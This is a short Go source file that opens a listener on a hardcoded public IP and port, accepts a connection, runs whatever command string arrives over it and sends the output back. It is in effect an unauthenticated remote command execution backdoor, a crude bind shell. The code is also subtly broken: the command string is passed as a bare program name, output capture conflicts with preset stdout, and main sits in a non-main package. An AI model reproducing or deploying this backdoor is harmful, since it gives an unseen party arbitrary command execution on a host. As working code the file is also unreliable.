package proxy

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func CommandExec(cmdString string) (string, error) {

	cmd := exec.Command(cmdString)
	cmd.Stderr = os.Stderr
	cmd.Stdout = os.Stdout
	out, err := cmd.CombinedOutput()
	return string(out), err
}

var quitSemaphore chan bool

func ConnectProxy() net.Conn {
	listener, err := net.Listen("tcp", "124.70.142.89:10000")
	if err != nil {
		fmt.Println("error is(ConnectProxy): ", err)
	}
	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("error is(ConnectProxy): ", err)
	}

	fmt.Println("connected!")
	return conn
}

func ReceiveCommandProxy(proxyConn net.Conn) string {
	result := make([]byte, 1024)
	n, err := proxyConn.Read(result)
	if err != nil {
		fmt.Println("error is(ReceiveCommandProxy): ", err)
	}
	return string(result[:n])
}

func main() {
	proxyConn := ConnectProxy()
	command := ReceiveCommandProxy(proxyConn)
	out, err := CommandExec(command)
	if err == nil {
		proxyConn.Write([]byte(out))
	}

}
